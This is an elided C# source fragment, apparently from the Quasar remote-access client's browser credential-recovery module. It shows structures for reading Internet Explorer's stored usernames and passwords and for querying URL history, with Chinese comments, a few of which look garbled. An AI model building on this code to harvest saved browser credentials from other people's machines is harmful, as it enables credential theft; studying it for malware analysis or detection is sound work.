...
namespace Quasar.Client.Recovery.Browsers
{
    public class InternetExplorerPassReader : IAccountReader
    {
        ...
        struct IESecretInfoHeader
        {
            ...
            public uint dwSize;         // 这个头的大小....24 字节
            public uint dwTotalSecrets; // 除以2，得到实际的网站条目
            public uint unknown;
        ...
        struct IEAutoComplteSecretHeader
        {
            ...
            public uint dwSecretSize;                  //实际秘密字符串的大小，如用户名和密码，
            public IESecretInfoHeader IESecretHeader;  //关于秘密的信息，如计数、大小等
            //SecretEntry secEntries[numSecrets];      //每个秘密字符串的头
            //WCHAR secrets[numSecrets];               //统一码中的实际秘密字符串

        };

        // 描述每一个秘密的头，比如说用户名/密码。
        // 具有相同SecretId的两个秘密条目被配对。961207
        [StructLayout(LayoutKind.Explicit)]
        struct SecretEntry
        {

            [FieldOffset(0)]
            public uint dwOffset;           //此秘密条目从秘密条目字符串开始的偏移量。

            [FieldOffset(4)]
            public byte SecretId;           //与秘密相关的UNIQUE ID
            [FieldOffset(5)]
        ...
        private enum HashParameters
        {
            ...
            HP_ALGID = 0x0001,   // 哈希算法
            HP_HASHVAL = 0x0002, // 哈希值
            HP_HASHSIZE = 0x0004 // 哈希值大小
    ...
    public class ExplorerUrlHistory : IDisposable
    {
        ...
        /// <summary>
        /// 将指定的URL放入历史记录。如果历史上不存在该URL，则在历史上创建一个条目。
        /// 如果历史上确实存在该URL，它将被覆盖。
        /// </summary>
        /// <param name="pocsUrl">要放在历史记录中的URL字符串</param>
        /// <param name="pocsTitle">与该URL相关的标题字符串</param>
        /// <param name="dwFlags">表示一个URL在历史中的位置的标志。
        ...
        /// <summary>
        /// 从历史记录中删除所有指定的URL实例。 不起作用
        /// </summary>
        /// <param name="pocsUrl">要删除的URL的字符串。</param>
        ...
        /// <summary>
        ///查询历史记录并报告当前用户是否访问过作为pocsUrl参数的URL。
        /// </summary>
        /// <param name="pocsUrl">要查询的URL的字符串要查询的URL的字符串。</param>
        /// <param name="dwFlags">STATURL_QUERYFLAGS 枚举
        /// <example><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></example></param>
        /// <returns>返回收到额外URL历史信息的STATURL结构。如果返回的STATURL的pwcsUrl不是空的，说明被查询的URL已经被当前用户访问过。
        /// </returns>
        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
        {
            ...
            try
            {
                ...
                //在这种情况下，被查询的URL已经被当前用户访问过。
                obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                //lpSTATURL.pwcsUrl不是空的。
                return lpSTATURL;
        ...
        /// <summary>
        /// 创建一个可以遍历历史缓存的枚举器。ExplorerUrlHistory没有实现IEnumerable接口
        /// </summary>
        /// <returns>Returns [{STATURLEnumerator}: M.S. : GetEnumerator() returns IEnumerator instead.] object that 可以遍历历史缓存。</returns>
    ...
    public class Win32api
    {
        ...
        /// <summary>
        /// 获取一个URL字符串，并将其转换为规范的形式
        /// </summary>
        /// <param name="pszUrl">URL字符串</param>
        /// <param name="dwFlags">shlwapi_URL 枚举。指定URL如何转换为规范形式的标志。</param>
        ...
        /// <summary>
        /// 将一个文件的时间转换为DateTime格式。
        /// </summary>
        /// <param name="filetime">FILETIME结构</param>
        ...
        /// <summary>
        /// 将一个DateTime转换为文件时间格式。
        /// </summary>
        /// <param name="datetime">DateTime结构</param>
        /// <returns>FILETIME结构</returns>
